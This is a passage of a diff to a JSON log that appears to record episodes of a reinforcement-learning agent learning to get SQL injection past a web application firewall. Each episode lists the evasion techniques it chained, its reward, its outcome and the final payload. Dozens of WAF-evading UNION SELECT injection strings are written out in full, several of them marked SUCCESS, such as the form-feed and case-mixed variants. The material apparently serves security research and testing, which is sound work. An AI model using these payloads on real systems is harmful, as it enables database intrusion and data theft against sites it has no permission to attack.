     "final_result": "WAF_BLOCKED",
     "sequence": [
-      "concat_char",
+      "unhex_wrap",
       "comment",
       "case",
-      "comment",
-      "vtab",
-      "comment",
-      "between_space",
-      "comment",
-      "plus_sep",
-      "comment",
-      "unhex_wrap",
+      "tab_space",
       "newline",
+      "tab_space",
+      "comment",
+      "crlf",
+      "hex_encode",
+      "comment",
+      "tab_space",
+      "comment",
       "newline",
-      "hash_nl",
-      "comment"
+      "comment",
+      "hash_nl_all"
     ],
-    "final_payload": "0'/**/unIoN%23xyz%0AseLeCT/**/1,2,3;%00"
+    "final_payload": "0'/**/UnIoN/**/sEleCT/**/0x31,0x32,0x33;%00"
   },
   {
     "episode": 43,
@@ -1056,23 +1056,23 @@
     "success": false,
     "final_result": "WAF_BLOCKED",
     "sequence": [
-      "crlf",
-      "tab_space",
+      "distinct",
       "comment",
-      "vtab",
-      "gbk_bypass",
       "comment",
-      "hash_nl_all",
       "comment",
-      "tab_space",
       "newline",
-      "newline",
-      "nested_or",
+      "nested_union",
+      "paren_full",
       "comment",
-      "tab_space",
-      "comment"
+      "case",
+      "comment",
+      "comment",
+      "newline",
+      "comment",
+      "comment",
+      "url_encode"
     ],
-    "final_payload": "0%bf%27%0d%0aUNION%0d%0aSELECT%0d%0a1,2,3;%00"
+    "final_payload": "0'/**/UNIUNiONON/**/DISTINCTROW/**/SELSelECtECT/**/1,2,3;%00"
   },
   {
     "episode": 44,
@@ -1081,23 +1081,23 @@
     "success": false,
     "final_result": "WAF_BLOCKED",
     "sequence": [
-      "unhex_wrap",
-      "between_space",
-      "newline",
-      "double_and",
+      "gbk_bypass",
       "nested_or",
       "comment",
-      "newline",
-      "newline",
-      "tab_space",
-      "double_encode",
       "comment",
-      "ver_00000",
-      "dbl_url_comment",
+      "paren_space",
       "comment",
-      "newline"
+      "hex_encode",
+      "formfeed",
+      "paren_space",
+      "comment",
+      "comment",
+      "newline",
+      "convert_charset",
+      "double_or",
+      "comment"
     ],
-    "final_payload": "0'%a0/*!00000UNION*/%a0/*!00000SELECT*/%a01,2,3;%00"
+    "final_payload": "0%bf%27/**/UNION(SELECT/**/(1),(2),(3;%00))"
   },
   {
     "episode": 45,
@@ -1106,23 +1106,23 @@
     "success": false,
     "final_result": "WAF_BLOCKED",
     "sequence": [
-      "convert_charset",
+      "backtick",
       "comment",
-      "distinct",
+      "case_split",
+      "comment",
+      "tab_space",
+      "tab_space",
+      "newline",
+      "crlf",
+      "comment",
       "vtab",
       "comment",
-      "paren_space",
-      "ver_12345",
+      "formfeed",
       "comment",
-      "comment",
-      "comment",
-      "distinct",
-      "plus_sep",
-      "comment",
-      "ver_50000",
-      "comment"
+      "crlf",
+      "plus_sep"
     ],
-    "final_payload": "0'/**//*!40100UNION*//**/DISTINCTROW/**//*!40100SELECT*//**/1,2,3;%00"
+    "final_payload": "0'/**/`UNIoN`/**/`sElEcT`/**/1,2,3;%00"
   },
   {
     "episode": 46,
@@ -1131,23 +1131,23 @@
     "success": false,
     "final_result": "WAF_BLOCKED",
     "sequence": [
-      "distinct",
+      "ver_50000",
+      "vtab",
+      "nested_union",
       "comment",
-      "case_split",
       "comment",
-      "paren_full",
+      "newline",
       "comment",
-      "hash_nl",
       "comment",
-      "double_encode",
+      "newline",
       "comment",
-      "tab_space",
+      "char_split",
+      "convert_charset",
       "comment",
-      "plus_sep",
       "comment",
-      "double_encode"
+      "newline"
     ],
-    "final_payload": "0'/**/uNIon/**/ALL/**/sELEct/**/1,2,3;%00"
+    "final_payload": "0'%0b/*!50100UNI/*u*//*n*//*i*//*o*//*n*/ON*/%0b/*!50100SEL/*s*//*e*//*l*//*e*//*c*//*t*/ECT*/%0b1,2,3;%00"
   },
   {
     "episode": 47,
@@ -1156,23 +1156,23 @@
     "success": false,
     "final_result": "WAF_BLOCKED",
     "sequence": [
-      "gbk_bypass",
+      "dbl_url_comment",
       "comment",
-      "comment",
-      "distinct",
-      "comment",
-      "comment",
+      "url_encode",
       "comment",
       "tab_space",
       "comment",
-      "paren_full",
+      "char_split",
+      "comment",
+      "tab_space",
+      "formfeed",
       "comment",
       "tab_space",
       "comment",
-      "tab_space",
+      "comment",
       "newline"
     ],
-    "final_payload": "0%bf%27/**/UNION/**/ALL/**/SELECT/**/1,2,3;%00"
+    "final_payload": "0'/**/%55NION/**/%53ELECT/**/1,2,3;%00"
   },
   {
     "episode": 48,
@@ -1181,23 +1181,23 @@
     "success": false,
     "final_result": "WAF_BLOCKED",
     "sequence": [
-      "backtick",
       "comment",
-      "url_encode",
+      "nested_or",
       "comment",
+      "vtab",
+      "newline",
+      "crlf",
+      "newline",
+      "crlf",
       "tab_space",
-      "comment",
       "newline",
       "comment",
-      "crlf",
-      "comment",
-      "paren_space",
-      "comment",
-      "distinct",
-      "comment",
-      "tab_space"
+      "dbl_url_comment",
+      "param_pollute",
+      "ver_urlenc",
+      "comment"
     ],
-    "final_payload": "0'/**/`%55NION`/**/`%53ELECT`/**/1,2,3;%00"
+    "final_payload": "0'%252f%252a*//*!50001%55NION*/%252f%252a*//*!50001%53ELECT*/%252f%252a*/1,2,3;%00"
   },
   {
     "episode": 49,
@@ -1206,23 +1206,23 @@
     "success": false,
     "final_result": "WAF_BLOCKED",
     "sequence": [
-      "dbl_url_comment",
+      "newline",
+      "tab_space",
+      "comment",
+      "tab_space",
       "newline",
       "crlf",
-      "tab_space",
-      "tab_space",
-      "paren_full",
-      "comment",
-      "hash_nl",
-      "comment",
       "comment",
       "newline",
-      "comment",
+      "tab_space",
       "newline",
-      "comment",
-      "nested_union"
+      "ver_00000",
+      "between_space",
+      "newline",
+      "newline",
+      "gbk_bypass"
     ],
-    "final_payload": "0'%0aUNIunionON%23xyz%0ASELselectECT%0a1,2,3;%00"
+    "final_payload": "0%bf%27%0a/*!00000UNION*/%0a/*!00000SELECT*/%0a1,2,3;%00"
   },
   {
     "episode": 50,
@@ -1231,23 +1231,23 @@
     "success": false,
     "final_result": "WAF_BLOCKED",
     "sequence": [
-      "paren_space",
+      "newline",
+      "hash_nl_all",
       "comment",
+      "crlf",
       "comment",
+      "nested_and",
       "comment",
-      "hex_encode",
-      "paren_space",
+      "tab_space",
       "comment",
-      "comment",
-      "nested_or",
-      "comment",
-      "comment",
+      "crlf",
       "plus_sep",
       "comment",
+      "vtab",
       "comment",
-      "newline"
+      "formfeed"
     ],
-    "final_payload": "0'/**/UNION(SELECT/**/(1),(2),(3;%00))"
+    "final_payload": "0'%0aUNION%0aSELECT%0a1,2,3;%00"
   },
   {
     "episode": 51,
@@ -1256,23 +1256,23 @@
     "success": false,
     "final_result": "WAF_BLOCKED",
     "sequence": [
+      "nested_and",
       "newline",
-      "ver_12345",
-      "unhex_wrap",
-      "comment",
-      "comment",
+      "crlf",
       "newline",
-      "comment",
-      "comment",
+      "vtab",
+      "crlf",
       "newline",
+      "crlf",
+      "tab_space",
+      "tab_space",
+      "crlf",
       "comment",
+      "between_space",
       "comment",
-      "newline",
-      "newline",
-      "comment",
-      "comment"
+      "nested_and"
     ],
-    "final_payload": "0'%0a/*!12345UNION/**/SELECT*/%0a1,2,3;%00"
+    "final_payload": "0'%0aUNION%0aSELECT%0a1,2,3;%00"
   },
   {
     "episode": 52,
@@ -1281,23 +1281,23 @@
     "success": false,
     "final_result": "WAF_BLOCKED",
     "sequence": [
-      "vtab",
+      "formfeed",
+      "distinct",
+      "nested_or",
+      "comment",
+      "comment",
       "newline",
       "comment",
-      "tab_space",
       "comment",
-      "crlf",
+      "nested_and",
       "comment",
-      "tab_space",
       "comment",
-      "tab_space",
+      "newline",
       "comment",
-      "tab_space",
-      "between_space",
-      "comment",
-      "ver_12345"
+      "hash_nl_all",
+      "comment"
     ],
-    "final_payload": "0'%0b/*!12345UNION SELECT*/%0b1,2,3;%00"
+    "final_payload": "0'%0cUNION%0cDISTINCTROW%0cSELECT%0c1,2,3;%00"
   },
   {
     "episode": 53,
@@ -1306,23 +1306,23 @@
     "success": false,
     "final_result": "WAF_BLOCKED",
     "sequence": [
-      "vtab",
-      "formfeed",
-      "tab_space",
-      "nested_and",
-      "double_and",
+      "between_space",
+      "url_encode",
       "comment",
-      "crlf",
+      "ver_12345",
+      "comment",
+      "comment",
+      "comment",
+      "comment",
       "newline",
+      "comment",
+      "comment",
       "newline",
-      "newline",
-      "tab_space",
-      "newline",
-      "newline",
-      "tab_space",
+      "comment",
+      "paren_space",
       "comment"
     ],
-    "final_payload": "0'%0bUNION%0bSELECT%0b1,2,3;%00"
+    "final_payload": "0'%a0%55NION%a0%53ELECT%a01,2,3;%00"
   },
   {
     "episode": 54,
@@ -1331,23 +1331,23 @@
     "success": false,
     "final_result": "WAF_BLOCKED",
     "sequence": [
-      "between_space",
-      "tab_space",
+      "crlf",
+      "newline",
+      "vtab",
+      "comment",
+      "vtab",
+      "ver_00000",
+      "comment",
+      "ver_newline",
+      "url_encode",
+      "comment",
+      "nested_and",
       "comment",
       "newline",
       "comment",
-      "tab_space",
-      "comment",
-      "tab_space",
-      "newline",
-      "comment",
-      "comment",
-      "newline",
-      "comment",
-      "comment",
-      "gbk_bypass"
+      "tab_space"
     ],
-    "final_payload": "0%bf%27%a0UNION%a0SELECT%a01,2,3;%00"
+    "final_payload": "0'%0d%0a/*!00000%55NION*/%0d%0a/*!00000%53ELECT*/%0d%0a1,2,3;%00"
   },
   {
     "episode": 55,
@@ -1356,35 +1356,48 @@
     "success": false,
     "final_result": "WAF_BLOCKED",
     "sequence": [
-      "double_encode",
-      "newline",
+      "plus_sep",
+      "tab_space",
       "hash_nl_all",
-      "newline",
+      "comment",
+      "tab_space",
+      "keyword_split",
       "comment",
       "vtab",
       "comment",
-      "gbk_bypass",
-      "dbl_url_comment",
-      "comment",
+      "between_space",
       "comment",
       "paren_space",
-      "crlf",
-      "case",
-      "crlf"
+      "comment",
+      "vtab",
+      "comment"
     ],
-    "final_payload": "0%bf%27%2520UNiOn%2520sElECt%25201,2,3;%00"
+    "final_payload": "0'+UN/**/ION+SEL/**/ECT+1,2,3;%00"
   },
   {
     "episode": 56,
-    "steps": 2,
-    "total_reward": 7.76,
-    "success": true,
-    "final_result": "SUCCESS",
+    "steps": 15,
+    "total_reward": -39.6,
+    "success": false,
+    "final_result": "WAF_BLOCKED",
     "sequence": [
-      "case",
+      "hash_nl_all",
+      "comment",
+      "ver_newline",
+      "comment",
+      "tab_space",
+      "gbk_bypass",
+      "comment",
+      "comment",
+      "concat_char",
+      "comment",
+      "formfeed",
+      "double_or",
+      "comment",
+      "comment",
       "newline"
     ],
-    "final_payload": "0'%0auNIon%0asEleCT%0a1,2,3;%00"
+    "final_payload": "0%bf%27%23zz%0A%0A/*!50000%55NION*/%23zz%0A/*!%53ELECT*/%0A%23zz%0A1,2,3;%00"
   },
   {
     "episode": 57,
@@ -1393,23 +1406,23 @@
     "success": false,
     "final_result": "WAF_BLOCKED",
     "sequence": [
-      "case_split",
+      "double_encode",
+      "comment",
+      "comment",
+      "crlf",
+      "comment",
+      "hash_nl_all",
+      "comment",
       "comment",
       "nested_or",
-      "formfeed",
-      "tab_space",
-      "crlf",
       "comment",
-      "case",
+      "convert_charset",
       "comment",
-      "crlf",
       "tab_space",
       "newline",
-      "tab_space",
-      "newline",
-      "crlf"
+      "comment"
     ],
-    "final_payload": "0'/**/uNiON/**/SeLECT/**/1,2,3;%00"
+    "final_payload": "0'%2520UNION%2520SELECT%25201,2,3;%00"
   },
   {
     "episode": 58,
@@ -1418,23 +1431,23 @@
     "success": false,
     "final_result": "WAF_BLOCKED",
     "sequence": [
-      "url_encode",
-      "newline",
+      "case",
+      "comment",
+      "url_mid_char",
+      "comment",
       "between_space",
-      "comment",
-      "comment",
       "newline",
-      "paren_full",
-      "comment",
-      "comment",
-      "comment",
+      "vtab",
       "newline",
-      "comment",
-      "comment",
+      "formfeed",
       "newline",
-      "tab_space"
+      "newline",
+      "tab_space",
+      "paren_space",
+      "backtick",
+      "crlf"
     ],
-    "final_payload": "0'%0a%55NION%0a%53ELECT%0a1,2,3;%00"
+    "final_payload": "0'/**/uNION(`SELECT`%0d%0a(1),(2),(3;%00))"
   },
   {
     "episode": 59,
@@ -1443,48 +1456,36 @@
     "success": false,
     "final_result": "WAF_BLOCKED",
     "sequence": [
-      "comment",
-      "url_mid_char",
-      "comment",
-      "param_pollute",
-      "comment",
-      "between_space",
-      "paren_space",
+      "newline",
+      "formfeed",
       "comment",
       "formfeed",
       "comment",
+      "between_space",
+      "comment",
       "vtab",
       "comment",
-      "tab_space",
-      "tab_space",
-      "case"
+      "nested_and",
+      "comment",
+      "vtab",
+      "newline",
+      "newline",
+      "tab_space"
     ],
-    "final_payload": "0'/**/UN%49ON/**/SEL%45CT/**/1,2,3;%00"
+    "final_payload": "0'%0aUNION%0aSELECT%0a1,2,3;%00"
   },
   {
     "episode": 60,
-    "steps": 15,
-    "total_reward": -39.6,
-    "success": false,
-    "final_result": "WAF_BLOCKED",
+    "steps": 3,
+    "total_reward": 5.52,
+    "success": true,
+    "final_result": "SUCCESS",
     "sequence": [
-      "keyword_split",
-      "comment",
-      "keyword_split",
-      "tab_space",
-      "comment",
-      "plus_sep",
-      "comment",
       "case_split",
-      "comment",
-      "formfeed",
-      "newline",
-      "vtab",
-      "comment",
-      "crlf",
-      "comment"
+      "case",
+      "formfeed"
     ],
-    "final_payload": "0'/**/UN/**/ION/**/SEL/**/ECT/**/1,2,3;%00"
+    "final_payload": "0'%0cUNIOn%0csELEcT%0c1,2,3;%00"
   },
   {
     "episode": 61,
@@ -1493,23 +1494,23 @@
     "success": false,
     "final_result": "WAF_BLOCKED",
     "sequence": [
-      "char_split",
-      "comment",
+      "backtick",
+      "newline",
       "between_space",
-      "newline",
-      "newline",
-      "tab_space",
-      "tab_space",
-      "crlf",
       "comment",
-      "tab_space",
+      "plus_sep",
+      "ver_50000",
       "comment",
-      "formfeed",
+      "vtab",
+      "nested_union",
       "comment",
-      "newline",
-      "newline"
+      "comment",
+      "ver_newline",
+      "comment",
+      "comment",
+      "paren_full"
     ],
-    "final_payload": "0'%a0/*U*//*N*//*I*//*O*//*N*/%a0/*S*//*E*//*L*//*E*//*C*//*T*/%a01,2,3;%00"
+    "final_payload": "0'%0a`/*!40100UNIunionON*/`%0a`/*!40100SELselectECT*/`%0a1,2,3;%00"
   },
   {
     "episode": 62,
@@ -1518,23 +1519,23 @@
     "success": false,
     "final_result": "WAF_BLOCKED",
     "sequence": [
-      "ver_50000",
-      "gbk_bypass",
+      "keyword_split",
       "comment",
+      "keyword_split",
+      "dbl_url_comment",
       "comment",
-      "crlf",
-      "plus_sep",
       "vtab",
-      "hex_encode",
-      "comment",
       "comment",
       "newline",
-      "comment",
+      "nested_or",
+      "newline",
+      "newline",
       "tab_space",
-      "comment",
+      "tab_space",
+      "crlf",
       "comment"
     ],
-    "final_payload": "0%bf%27%0d%0a/*!50000UNION*/%0d%0a/*!50000SELECT*/%0d%0a1,2,3;%00"
+    "final_payload": "0'%252f%252a*/UN%252f%252a*/ION%252f%252a*/SEL%252f%252a*/ECT%252f%252a*/1,2,3;%00"
   },
   {
     "episode": 63,
@@ -1543,23 +1544,23 @@
     "success": false,
     "final_result": "WAF_BLOCKED",
     "sequence": [
-      "ver_00000",
-      "comment",
-      "comment",
-      "paren_full",
+      "char_split",
       "newline",
-      "case",
+      "plus_sep",
+      "plus_sep",
       "comment",
-      "newline",
-      "newline",
-      "case_split",
-      "keyword_split",
+      "double_encode",
       "comment",
-      "tab_space",
+      "formfeed",
       "comment",
-      "crlf"
+      "formfeed",
+      "comment",
+      "between_space",
+      "nested_union",
+      "comment",
+      "paren_full"
     ],
-    "final_payload": "0'%0a/*!00000uNiOn*/%0a/*!00000sELEct*/%0a1,2,3;%00"
+    "final_payload": "0'%0a/*U*//*N*//*I*//*O*//*N*/%0a/*S*//*E*//*L*//*E*//*C*//*T*/%0a1,2,3;%00"
   },
   {
     "episode": 64,
@@ -1568,23 +1569,23 @@
     "success": false,
     "final_result": "WAF_BLOCKED",
     "sequence": [
-      "ver_12345",
+      "ver_00000",
+      "paren_space",
+      "hash_nl",
       "comment",
+      "tab_space",
       "comment",
+      "nested_and",
+      "comment",
+      "url_encode",
       "comment",
       "newline",
+      "nested_and",
       "comment",
-      "between_space",
-      "comment",
-      "tab_space",
-      "comment",
-      "tab_space",
       "newline",
-      "tab_space",
-      "distinct",
-      "comment"
+      "case_split"
     ],
-    "final_payload": "0'%0a/*!12345UNION/**/DISTINCT/**/SELECT*/%0a1,2,3;%00"
+    "final_payload": "0'%09/*!00000%55NION*/%09/*!00000%53ELECT*/%091,2,3;%00"
   },
   {
     "episode": 65,
@@ -1593,23 +1594,23 @@
     "success": false,
     "final_result": "WAF_BLOCKED",
     "sequence": [
-      "ver_urlenc",
-      "paren_full",
-      "formfeed",
-      "url_encode",
-      "comment",
-      "between_space",
-      "comment",
-      "tab_space",
-      "comment",
+      "ver_newline",
       "newline",
       "comment",
-      "newline",
       "comment",
-      "tab_space",
+      "case",
+      "comment",
+      "convert_charset",
+      "comment",
+      "char_split",
+      "paren_space",
+      "comment",
+      "comment",
+      "comment",
+      "double_and",
       "comment"
     ],
-    "final_payload": "0'%0c/*!50001%55NION*/%0c/*!50001%53ELECT*/%0c1,2,3;%00"
+    "final_payload": "0'/**/%0A/*!50000%55NION*/ /*!%53ELECT*/%0A/**/1,2,3;%00"
   },
   {
     "episode": 66,
@@ -1618,23 +1619,23 @@
     "success": false,
     "final_result": "WAF_BLOCKED",
     "sequence": [
-      "ver_newline",
+      "keyword_split",
       "newline",
       "comment",
-      "paren_full",
       "comment",
-      "paren_full",
-      "comment",
-      "backtick",
       "newline",
-      "newline",
-      "tab_space",
       "comment",
+      "comment",
+      "newline",
+      "paren_space",
       "comment",
       "plus_sep",
+      "tab_space",
+      "comment",
+      "hash_nl_all",
       "comment"
     ],
-    "final_payload": "0'/**/%0A/*!50000%55NION*/%09/*!%53ELECT*/%0A/**/1,2,3;%00"
+    "final_payload": "0'%0aUN/**/ION%0aSEL/**/ECT%0a1,2,3;%00"
   },
   {
     "episode": 67,
@@ -1643,43 +1644,48 @@
     "success": false,
     "final_result": "WAF_BLOCKED",
     "sequence": [
-      "hash_nl_all",
+      "ver_12345",
+      "newline",
       "newline",
       "comment",
+      "newline",
+      "newline",
+      "newline",
       "tab_space",
+      "unhex_wrap",
+      "comment",
+      "newline",
+      "formfeed",
       "comment",
       "crlf",
-      "newline",
-      "paren_full",
-      "comment",
-      "nested_or",
-      "comment",
-      "tab_space",
-      "comment",
-      "ver_12345",
-      "comment"
+      "newline"
     ],
-    "final_payload": "0'%23zz%0AUNION%23zz%0ASELECT%23zz%0A1,2,3;%00"
+    "final_payload": "0'%0a/*!12345UNION%0aSELECT*/%0a1,2,3;%00"
   },
   {
     "episode": 68,
-    "steps": 10,
-    "total_reward": -12.4,
-    "success": true,
-    "final_result": "SUCCESS",
+    "steps": 15,
+    "total_reward": -39.6,
+    "success": false,
+    "final_result": "WAF_BLOCKED",
     "sequence": [
-      "paren_full",
+      "ver_urlenc",
+      "newline",
+      "newline",
+      "comment",
+      "comment",
+      "newline",
+      "newline",
       "vtab",
+      "comment",
       "tab_space",
       "newline",
+      "url_mid_char",
       "comment",
-      "vtab",
-      "comment",
-      "vtab",
-      "newline",
-      "case"
+      "crlf",
+      "char_split"
     ],
-    "final_payload": "0'%0buniOn%0bSElEct%0b1,2,3;%00"
+    "final_payload": "0'%0a/*!50000%55NION*/%0a/*!50000%53ELECT*/%0a1,2,3;%00"
   },
   {
     "episode": 69,
@@ -1688,23 +1694,23 @@
     "success": false,
     "final_result": "WAF_BLOCKED",
     "sequence": [
-      "param_pollute",
-      "comment",
-      "paren_space",
-      "comment",
-      "hex_encode",
-      "comment",
-      "crlf",
+      "backtick",
+      "tab_space",
+      "tab_space",
+      "newline",
       "comment",
       "vtab",
+      "url_mid_char",
       "comment",
       "crlf",
+      "vtab",
       "comment",
-      "crlf",
+      "hash_nl",
+      "distinct",
       "comment",
-      "vtab"
+      "tab_space"
     ],
-    "final_payload": "0'/**/UNION/*&x=1*/SELECT/*&x=1*/1,2,3;%00"
+    "final_payload": "0'%09`UN%49ON`%09`SEL%45CT`%091,2,3;%00"
   },
   {
     "episode": 70,
@@ -1713,23 +1719,23 @@
     "success": false,
     "final_result": "WAF_BLOCKED",
     "sequence": [
-      "nested_or",
-      "newline",
-      "vtab",
-      "comment",
-      "formfeed",
+      "paren_space",
       "comment",
       "crlf",
-      "newline",
+      "comment",
+      "comment",
+      "plus_sep",
+      "comment",
+      "hex_encode",
+      "crlf",
+      "comment",
       "comment",
       "newline",
-      "tab_space",
-      "ver_urlenc",
       "comment",
-      "newline",
-      "comment"
+      "comment",
+      "hash_nl"
     ],
-    "final_payload": "0'%0a/*!50001%55NION*/%0a/*!50001%53ELECT*/%0a1,2,3;%00"
+    "final_payload": "0'/**/UNION(SELECT/**/(1),(2),(3;%00))"
   },
   {
     "episode": 71,
@@ -1738,23 +1744,23 @@
     "success": false,
     "final_result": "WAF_BLOCKED",
     "sequence": [
-      "nested_and",
-      "tab_space",
-      "vtab",
+      "paren_full",
+      "comment",
+      "char_split",
+      "comment",
+      "comment",
+      "plus_sep",
       "comment",
       "formfeed",
-      "ver_00000",
       "comment",
-      "backtick",
+      "plus_sep",
       "comment",
+      "double_encode",
+      "between_space",
       "comment",
-      "newline",
-      "comment",
-      "ver_newline",
-      "hash_nl_all",
-      "comment"
+      "formfeed"
     ],
-    "final_payload": "0'%09/*!00000`UNION`*/%09/*!00000`SELECT`*/%091,2,3;%00"
+    "final_payload": "0'/**//*U*//*N*//*I*//*O*//*N*//**//*S*//*E*//*L*//*E*//*C*//*T*//**/1,2,3;%00"
   },
   {
     "episode": 72,
@@ -1763,23 +1769,23 @@
     "success": false,
     "final_result": "WAF_BLOCKED",
     "sequence": [
-      "nested_union",
+      "hash_nl",
       "newline",
       "comment",
-      "hex_encode",
+      "param_pollute",
       "ver_12345",
       "comment",
       "comment",
       "newline",
-      "comment",
-      "distinct",
-      "formfeed",
+      "paren_full",
       "comment",
       "comment",
       "newline",
-      "comment"
+      "comment",
+      "comment",
+      "scientific"
     ],
-    "final_payload": "0'%0aUNIunionON%0aSELselectECT%0a1,2,3;%00"
+    "final_payload": "0'/**/UNION%23xyz%0ASELECT/*&id=*/1,2,3;%00"
   },
   {
     "episode": 73,
@@ -1788,48 +1794,48 @@
     "success": false,
     "final_result": "WAF_BLOCKED",
     "sequence": [
-      "double_or",
-      "nested_and",
-      "dbl_url_comment",
-      "comment",
-      "tab_space",
-      "newline",
-      "newline",
       "hash_nl_all",
-      "tab_space",
-      "tab_space",
-      "crlf",
-      "crlf",
-      "distinct",
+      "param_pollute",
+      "case_split",
       "comment",
-      "formfeed"
+      "tab_space",
+      "comment",
+      "nested_or",
+      "case",
+      "nested_or",
+      "comment",
+      "tab_space",
+      "comment",
+      "tab_space",
+      "comment",
+      "nested_union"
     ],
-    "final_payload": "0'/**/UNION/**/ALL/**/SELECT/**/1,2,3;%00"
+    "final_payload": "0'%23xx%0AUnIoN%23xx%0ASelecT%23xx%0A1,2,3;%00"
   },
   {
     "episode": 74,
     "steps": 15,
-    "total_reward": -34.6,
+    "total_reward": -39.6,
     "success": false,
-    "final_result": "SQL_ERROR",
+    "final_result": "WAF_BLOCKED",
     "sequence": [
+      "param_pollute",
+      "hex_encode",
+      "comment",
+      "concat_char",
+      "hex_encode",
+      "comment",
+      "double_and",
       "backtick",
-      "newline",
-      "formfeed",
-      "newline",
-      "formfeed",
-      "nested_or",
       "comment",
-      "vtab",
+      "case_split",
       "comment",
-      "double_encode",
       "comment",
-      "tab_space",
       "comment",
-      "case",
+      "url_encode",
       "comment"
     ],
-    "final_payload": "0'%0a`UNIoN`%0a`seleCT`%0a1,2,3;%00"
+    "final_payload": "0'/**/`UnIoN`/*&x=1*/`selECT`/*&x=1*/1,2,3;%00"
   },
   {
     "episode": 75,
@@ -1838,23 +1844,23 @@
     "success": false,
     "final_result": "WAF_BLOCKED",
     "sequence": [
-      "vtab",
-      "formfeed",
-      "crlf",
-      "convert_charset",
-      "hash_nl",
-      "comment",
-      "comment",
+      "nested_or",
       "newline",
-      "comment",
-      "comment",
-      "newline",
-      "formfeed",
-      "comment",
       "ver_12345",
-      "comment"
+      "comment",
+      "comment",
+      "newline",
+      "comment",
+      "tab_space",
+      "comment",
+      "tab_space",
+      "comment",
+      "crlf",
+      "crlf",
+      "comment",
+      "newline"
     ],
-    "final_payload": "0'%0bUNION%23xyz%0ASELECT%0b1,2,3;%00"
+    "final_payload": "0'%0a/*!12345UNION/**/SELECT*/%0a1,2,3;%00"
   },
   {
     "episode": 76,
@@ -1863,23 +1869,23 @@
     "success": false,
     "final_result": "WAF_BLOCKED",
     "sequence": [
-      "double_and",
+      "nested_union",
       "newline",
-      "nested_or",
       "comment",
-      "between_space",
       "comment",
-      "formfeed",
+      "newline",
       "comment",
-      "between_space",
+      "comment",
+      "newline",
       "comment",
       "crlf",
+      "ver_newline",
+      "dbl_url_comment",
+      "plus_sep",
       "comment",
-      "tab_space",
-      "newline",
-      "newline"
+      "formfeed"
     ],
-    "final_payload": "0'%0aUNION%0aSELECT%0a1,2,3;%00"
+    "final_payload": "0'%0aUNI%0A/*!50000%55nion*/ON%0aSEL/*!%53elect*/%0AECT%0a1,2,3;%00"
   },
   {
     "episode": 77,
@@ -1888,69 +1894,63 @@
     "success": false,
     "final_result": "WAF_BLOCKED",
     "sequence": [
-      "hex_encode",
-      "hash_nl",
-      "nested_and",
+      "ver_12345",
+      "tab_space",
+      "double_or",
+      "comment",
+      "comment",
+      "tab_space",
       "comment",
       "comment",
       "newline",
       "comment",
       "comment",
       "newline",
-      "comment",
-      "comment",
-      "newline",
-      "comment",
-      "comment",
-      "newline"
+      "plus_sep",
+      "distinct",
+      "ver_50000"
     ],
-    "final_payload": "0'/**/UNION%23foo%0ASELECT/**/0x31,0x32,0x33;%00"
+    "final_payload": "0'%09/*!12345UNION%09DISTINCT%09SELECT*/%091,2,3;%00"
   },
   {
     "episode": 78,
+    "steps": 5,
+    "total_reward": 0.8,
+    "success": true,
+    "final_result": "SUCCESS",
+    "sequence": [
+      "double_or",
+      "newline",
+      "double_encode",
+      "comment",
+      "case"
+    ],
+    "final_payload": "0'%0auniON%0aselEct%0a1,2,3;%00"
+  },
+  {
+    "episode": 79,
     "steps": 15,
     "total_reward": -39.6,
     "success": false,
     "final_result": "WAF_BLOCKED",
     "sequence": [
-      "hash_nl_all",
+      "nested_or",
       "tab_space",
-      "comment",
-      "vtab",
-      "comment",
-      "formfeed",
-      "case_split",
-      "comment",
+      "crlf",
       "newline",
       "newline",
+      "tab_space",
+      "tab_space",
       "crlf",
       "comment",
+      "crlf",
+      "comment",
+      "vtab",
       "concat_char",
       "comment",
-      "comment"
+      "crlf"
     ],
-    "final_payload": "0'%23zz%0AuNion%23zz%0AsElEcT%23zz%0A1,2,3;%00"
-  },
-  {
-    "episode": 79,
-    "steps": 11,
-    "total_reward": -15.28,
-    "success": true,
-    "final_result": "SUCCESS",
-    "sequence": [
-      "formfeed",
-      "vtab",
-      "crlf",
-      "newline",
-      "newline",
-      "comment",
-      "formfeed",
-      "comment",
-      "between_space",
-      "newline",
-      "case"
-    ],
-    "final_payload": "0'%0cunION%0cselEct%0c1,2,3;%00"
+    "final_payload": "0'%09UNION%09SELECT%091,2,3;%00"
   },
   {
     "episode": 80,
@@ -1959,23 +1959,23 @@
     "success": false,
     "final_result": "WAF_BLOCKED",
     "sequence": [
-      "scientific",
+      "double_and",
       "newline",
-      "between_space",
-      "newline",
-      "between_space",
-      "gbk_bypass",
-      "newline",
-      "comment",
-      "crlf",
+      "hex_encode",
       "comment",
       "comment",
       "newline",
+      "backtick",
       "comment",
-      "crlf",
-      "scientific"
+      "comment",
+      "comment",
+      "newline",
+      "hash_nl_all",
+      "comment",
+      "comment",
+      "newline"
     ],
-    "final_payload": "0%bf%27%0aUNION%0aSELECT%0a1e0,2e0,3e0;%00"
+    "final_payload": "0'%0a`UNION`%0a`SELECT`%0a0x31,0x32,0x33;%00"
   },
   {
     "episode": 81,
@@ -1984,23 +1984,23 @@
     "success": false,
     "final_result": "WAF_BLOCKED",
     "sequence": [
-      "concat_char",
+      "hex_encode",
       "newline",
-      "plus_sep",
       "comment",
-      "plus_sep",
-      "newline",
-      "hash_nl",
-      "newline",
+      "tab_space",
       "comment",
       "crlf",
+      "hash_nl_all",
+      "comment",
       "newline",
+      "comment",
       "tab_space",
-      "newline",
-      "newline",
-      "tab_space"
+      "comment",
+      "tab_space",
+      "comment",
+      "paren_space"
     ],
-    "final_payload": "0'%0aUNION%23aaa%0ASELECT%0a1,2,3;%00"
+    "final_payload": "0'%0aUNION(SELECT (0x31),(0x32),(0x33;%00))"
   },
   {
     "episode": 82,
@@ -2009,23 +2009,23 @@
     "success": false,
     "final_result": "WAF_BLOCKED",
     "sequence": [
-      "double_and",
-      "tab_space",
+      "scientific",
+      "paren_full",
+      "newline",
       "formfeed",
-      "comment",
-      "double_encode",
-      "double_or",
-      "nested_and",
+      "newline",
+      "between_space",
+      "newline",
+      "vtab",
+      "newline",
       "comment",
       "plus_sep",
-      "comment",
+      "newline",
       "crlf",
       "comment",
-      "crlf",
-      "comment",
-      "vtab"
+      "plus_sep"
     ],
-    "final_payload": "0'%09UNION%09SELECT%091,2,3;%00"
+    "final_payload": "0'%0aUNION%0aSELECT%0a1e0,2e0,3e0;%00"
   },
   {
     "episode": 83,
@@ -2034,73 +2034,51 @@
     "success": false,
     "final_result": "WAF_BLOCKED",
     "sequence": [
-      "unhex_wrap",
-      "comment",
-      "char_split",
-      "comment",
-      "dbl_url_comment",
-      "newline",
-      "comment",
